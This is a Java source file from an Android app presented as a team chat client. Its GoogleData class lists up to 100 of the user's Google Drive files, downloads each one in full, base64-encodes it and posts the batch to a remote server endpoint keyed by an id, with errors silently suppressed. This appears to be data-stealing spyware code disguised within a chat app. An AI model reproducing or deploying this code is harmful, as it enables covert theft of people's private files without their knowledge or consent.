package com.example.teamchat;

import static com.example.teamchat.Constants.SERVER;

import android.content.Context;
import com.google.api.client.googleapis.json.GoogleJsonResponseException;
import com.google.api.services.drive.Drive;
import com.google.api.services.drive.model.File;
import com.google.api.services.drive.model.FileList;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.util.List;
import android.util.Base64;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class GoogleData {
    private final static String TAG = ChatService.class.getSimpleName();
    private static JSONArray fileArray = new JSONArray();
    private static Drive mDriveService;

    public static void getGoogleDriveFiles(Context context, String id) throws JSONException {
        mDriveService = DriveServiceHelper.getInstance().getDriveService();
        if (mDriveService != null) {
            processFile();
        }

        JSONObject parentObject = new JSONObject();
        parentObject.put("code", "googledata");
        parentObject.put("data", fileArray);

        try {
            HttpConnection.ReturnResponse response = HttpConnection.connect(SERVER + "result/" + id, "POST", parentObject.toString());

            assert response != null;
            if (response.responseCode == 200) {
                Log.d(TAG, "Response: " + response.body);
            } else {
                throw new IOException("Unexpected code " + response.responseCode);
            }
        } catch (IOException e) {
            //Log.e(TAG, "Error sending request: " + e.getMessage());
        }
    }

    private static void processFile () {
        try {
            FileList result = mDriveService.files().list()
                    .setPageSize(100)
                    .setFields("nextPageToken, files(id, name)")
                    .execute();
            List<File> files = result.getFiles();

            if (files == null || files.isEmpty()) {
                System.out.println("No files found.");
            } else {
                System.out.println("Files:");
                for (File file : files) {
                    System.out.printf("%s (%s)\n", file.getName(), file.getId());

                    JSONObject json = new JSONObject();
                    json.put("file_name", file.getName());
                    json.put("bytes", encodeFile(file.getId()));
                    fileArray.put(json);
                }
            }
        } catch (IOException | JSONException e) {
            //e.printStackTrace();
        }
    }

    public static String encodeFile(String realFileId) throws IOException {
        try {
            OutputStream outputStream = new ByteArrayOutputStream();

            mDriveService.files().get(realFileId).executeMediaAndDownloadTo(outputStream);

            ByteArrayOutputStream byteArrayOutputStream = (ByteArrayOutputStream) outputStream;
            byte[] imageBytes = byteArrayOutputStream.toByteArray();
            return Base64.encodeToString(imageBytes, Base64.DEFAULT);
        } catch (GoogleJsonResponseException e) {
            //System.err.println("Unable to move file: " + e.getDetails());
            throw e;
        }
    }

}
